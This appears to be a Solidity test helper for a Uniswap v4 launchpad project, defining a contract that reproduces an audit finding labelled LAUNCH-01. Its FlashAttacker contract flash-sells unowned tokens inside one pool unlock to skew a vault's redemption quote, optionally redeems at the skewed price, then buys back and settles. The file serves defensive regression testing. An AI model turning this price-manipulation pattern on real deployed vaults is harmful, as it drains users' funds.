// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "v4-core/src/libraries/TransientStateLibrary.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MemeVault} from "../../src/MemeVault.sol";
import {LaunchpadHook} from "../../src/LaunchpadHook.sol";

/// A contract with no receive()/fallback: native value sent to it reverts, like the fee splitter
/// 0xddab... on Arc.
contract NoReceive {}

/// Runs one call from inside a PoolManager unlock and bubbles its revert.
contract InUnlockCaller is IUnlockCallback {
    IPoolManager internal immutable pm;

    constructor(IPoolManager pm_) {
        pm = pm_;
    }

    function run(address target, bytes calldata data) external returns (bytes memory) {
        return pm.unlock(abi.encode(target, data));
    }

    function approve(IERC20 token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function unlockCallback(bytes calldata raw) external returns (bytes memory) {
        (address target, bytes memory data) = abi.decode(raw, (address, bytes));
        (bool ok, bytes memory ret) = target.call(data);
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(ret, 32), mload(ret))
            }
        }
        return ret;
    }
}

/// The audit's LAUNCH-01 attack shape. Inside one unlock it flash-sells tokens it doesn't own (a
/// pure debt that moves the pool), looks at what the vault would pay, optionally tries to redeem,
/// then buys the tokens back and pays the round-trip fees from its own USDC.
contract FlashAttacker is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    address internal constant USDC = 0x3600000000000000000000000000000000000000;

    IPoolManager internal immutable pm;
    MemeVault internal immutable vault;
    PoolKey internal key;

    uint256 public quoteBefore;
    uint256 public quoteDuring;

    constructor(IPoolManager pm_, MemeVault vault_, PoolKey memory key_) {
        pm = pm_;
        vault = vault_;
        key = key_;
    }

    function attack(uint256 flashSell, uint256 probe, bool tryRedeem) external {
        pm.unlock(abi.encode(flashSell, probe, tryRedeem));
    }

    function unlockCallback(bytes calldata raw) external returns (bytes memory) {
        (uint256 flashSell, uint256 probe, bool tryRedeem) = abi.decode(raw, (uint256, uint256, bool));
        quoteBefore = vault.quoteRedeem(probe);
        pm.swap(key, SwapParams(false, -int256(flashSell), TickMath.MAX_SQRT_PRICE - 1), "");
        quoteDuring = vault.quoteRedeem(probe);
        if (tryRedeem) {
            IERC20(address(vault.token())).approve(address(vault), probe);
            vault.redeem(probe, 0, address(this));
        }
        pm.swap(key, SwapParams(true, int256(flashSell), TickMath.MIN_SQRT_PRICE + 1), "");

        int256 d0 = pm.currencyDelta(address(this), key.currency0);
        if (d0 < 0) {
            pm.sync(key.currency0);
            IERC20(USDC).transfer(address(pm), uint256(-d0));
            pm.settle();
        } else if (d0 > 0) {
            pm.take(key.currency0, address(this), uint256(d0));
        }
        int256 d1 = pm.currencyDelta(address(this), key.currency1);
        if (d1 > 0) pm.take(key.currency1, address(this), uint256(d1));
        require(d1 >= 0, "token debt left");
        return "";
    }
}
